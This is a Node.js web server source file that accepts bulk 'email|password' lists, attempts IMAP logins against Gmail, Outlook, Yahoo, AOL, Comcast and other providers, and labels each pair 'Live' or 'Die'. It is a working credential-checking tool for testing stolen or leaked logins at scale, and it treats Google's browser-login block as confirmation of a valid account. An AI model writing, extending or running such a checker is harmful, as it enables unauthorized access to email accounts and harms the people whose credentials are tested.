const imaps = require('imap-simple');
const express = require('express');
const bodyParser = require('body-parser')
const app = express();
const port = process.env.PORT||80
app.use(bodyParser.urlencoded({ extended: false }))
app.use(express.static('./dist'));
app.set('view engine', 'ejs');
app.set('views', './views');
app.use(express.static('./public'));

var server = require("http").Server(app);
var io = require("socket.io")(server);
server.listen(port);

io.on("connection", function(socket){
  socket.on("Client-send-data",function(data){
    let list = data.split(/(?:\r\n|\r|\n)/g);
    list.forEach(e => {
        split = e.split("|");
        var u = split[0];
        var p = split[1];
        checkemail(u,p).then(result =>{
            socket.emit("Serven-send-data",result)
        }).catch(error=>{
            socket.emit("Serven-send-data",{stt:0,ret:"Not support|"+u+"|"+p})
        })
        
    });
  });

});


app.get("/", function(req, res){
  res.render("index");
});


app.get('*', function(req, res) {
    res.send('Hello, World!');
  });
var mail_config = [
    {domain:"hotmail.com",host:"imap-mail.outlook.com",port:993,tls:true},
    {domain:"gmail.com",host:"imap.gmail.com",port:993,tls:true},
    //{domain:"att.net",host:"imap.mail.yahoo.com",port:993,tls:true},
    {domain:"yahoo.com",host:"imap.mail.yahoo.com",port:993,tls:true},
    {domain:"kc.rr.com",host:"mail.twc.com",port:993,tls:true},
    {domain:"cox.net",host:"imap.cox.net",port:993,tls:true},
    {domain:"sbcglobal.net",host:"imap.mail.yahoo.com",port:993,tls:true},
    {domain:"aol.com",host:"imap.aol.com",port:993,tls:true},
    {domain:"comcast.net",host:"imap.comcast.net",port:993,tls:true},
    {domain:".",host:"imap.gmail.com",port:993,tls:true}
];

function checkemail(email,password) {
    return new Promise((resolve, reject) => {
        email = email.trim()
        password = password.trim()
        let r = mail_config.find(mail => mail.domain === checktype(email));
        let config = {
            imap: {
                user: email,
                password: password,
                host: r.host,
                port: r.port,
                tls: r.tls,
                connectTimeout: 300000,
                authTimeout: 300000
            }
        };
        
        imaps.connect(config).then(connection => {
            resolve({stt:1,ret:"Live|"+email+"|"+password})
            connection.end()
        }).catch(error => {
            if (error.message == "Please log in via your web browser: https://support.google.com/mail/accounts/answer/78754 (Failure)") {
                resolve({stt:1,ret:"Live|"+email+"|"+password})
            }
            else{
                resolve({stt:0,ret:"Die|"+email+"|"+password})
            }
        })
    });

}
function checktype(email){
    let matches = email.match(/^[^@]+@([a-zA-Z0-9._-]+\.[a-zA-Z]+)$/);
    let domain = matches[1];
    return domain
}
